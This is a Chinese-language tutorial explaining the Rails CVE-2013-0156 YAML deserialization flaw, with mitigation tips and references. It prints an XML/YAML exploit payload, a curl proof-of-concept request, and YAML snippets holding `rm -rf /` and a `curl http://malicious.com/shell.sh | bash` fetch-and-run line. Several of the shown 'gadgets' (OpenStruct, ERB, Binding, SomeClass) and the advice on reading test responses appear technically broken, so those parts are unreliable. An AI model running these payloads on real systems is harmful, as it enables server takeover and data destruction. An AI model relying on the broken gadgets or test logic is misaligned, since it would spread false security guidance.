## 🧱 前提知识：YAML 反序列化与对象创建

在 Ruby 中，`YAML.load()` 是用于将 YAML 格式字符串反序列化为 Ruby 对象的方法。Ruby 默认使用 `Syck` 或 `Psych` 作为 YAML 解析器。

YAML 支持一种特殊语法，可以指定要反序列化的对象类型，例如：

```yaml
!ruby/object:Gem::Installer
i: x
```

上面的 YAML 表示“创建一个 `Gem::Installer` 类的实例”，即使该类并不是通常意义上的可安全反序列化的对象。

当 Rails 接收到包含这种 YAML 的 XML 请求时，会自动调用 `YAML.load()` 来解析数据，从而创建对应的 Ruby 对象。

---

## 🧪 示例攻击流程详解

### 1. 构造恶意 XML 数据

攻击者构造如下 XML 数据：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<exploit type="yaml">
---
:object: !ruby/object:Gem::Installer
  i: x
</exploit>
```

这段 XML 包含了一个嵌套的 YAML 文本块，其中指定了一个 `Gem::Installer` 对象。

### 2. Rails 自动解析 XML 并处理 YAML 内容

Rails 在接收到这个 XML 请求后，会尝试将其转换为 Ruby Hash，通常是通过以下方法：

```ruby
Hash.from_xml(xml_string)
```

这个方法内部会对 XML 中的内容进行解析。如果检测到某个字段看起来像是 YAML（比如以 `---` 开头），就会调用 `YAML.load()` 进行反序列化。

所以最终会执行类似这样的操作：

```ruby
YAML.load("---\n:object: !ruby/object:Gem::Installer\n  i: x")
```

### 3. 创建 Gem::Installer 实例

YAML 解析器识别出 `!ruby/object:Gem::Installer` 后，会尝试创建一个 `Gem::Installer` 类的实例。

虽然 `Gem::Installer` 本身并不是设计用来被反序列化的类，但其初始化函数可能会访问某些属性或触发某些行为。

例如，假设反序列化时传入了一些特定参数（如 gem 文件路径、选项等），那么它的 `initialize` 方法可能会尝试去安装某个 gem 包。

### 4. 利用已知漏洞触发任意代码执行

虽然 `Gem::Installer` 本身不会直接执行任意命令，但攻击者可以通过以下方式扩展利用：

#### ✅ 技巧一：调用其他类的危险方法

除了 `Gem::Installer`，攻击者还可以选择其他更“危险”的类，例如：

```yaml
!ruby/object:OpenStruct
m: { "method_missing": "system('rm -rf /')" }
```

或者：

```yaml
!ruby/object:ERB
  src: "<%= system('curl http://malicious.com/shell.sh | bash') %>"
```

这些类的某些方法可能在初始化或调用时会执行任意系统命令。

#### ✅ 技巧二：利用 `send` 或 `eval` 调用任意方法

Ruby 是动态语言，支持反射和元编程。攻击者可以通过构造特殊的对象结构，调用任意方法，比如：

```yaml
!ruby/object:SomeClass
  singleton_methods:
    - :eval
```

或者：

```yaml
!ruby/object:Binding
```

一旦能获得一个 `Binding` 对象，攻击者就可以在其上下文中执行任意 Ruby 代码。

---

## 🔐 为什么这是一个严重漏洞？

1. **无需用户权限即可触发**：攻击者只需发送一个 HTTP 请求。
2. **影响范围广**：所有接受 XML 输入的 Rails 应用都可能受影响。
3. **危害极高**：攻击者可以完全控制服务器。
4. **自动化攻击容易**：PoC 很简单，容易被扫描器或僵尸网络利用。

---

## 💡 安全建议总结

| 风险点 | 建议 |
|--------|------|
| 不安全的 YAML 反序列化 | 禁止使用 `YAML.load()` 处理不可信输入 |
| 使用 XML 接收复杂数据 | 尽量改用 JSON 格式 |
| 接受用户提交的对象结构 | 严格校验输入结构，避免自动映射 |
| 使用旧版本 Rails | 升级到最新稳定版 |

---

## 🧪 如何测试你的应用是否受影响？

你可以使用如下 PoC 请求进行本地测试（**仅限测试环境**）：

```bash
curl -X POST -H "Content-Type: application/xml" -d '
<?xml version="1.0" encoding="UTF-8"?>
<exploit type="yaml">
---
:object: !ruby/object:Gem::Installer
  i: x
</exploit>' http://your-rails-app.com/endpoint
```

如果你的应用返回异常错误（如找不到类、无法初始化）说明已经修复；如果没有任何报错甚至成功响应，说明可能存在风险。

---

## 📚 参考资料

- [CVE-2013-0156 官方公告](https://groups.google.com/forum/#!topic/rubyonrails-security/UuAVpzDsE4o)
- [Ruby on Rails 漏洞原理分析](https://www.rapid7.com/blog/post/2013/01/09/exploiting-code-from-the-cve-2013-0156-rails-vulnerability/)
- [Ruby YAML 反序列化漏洞 PoC](https://www.exploit-db.com/exploits/24112)

---
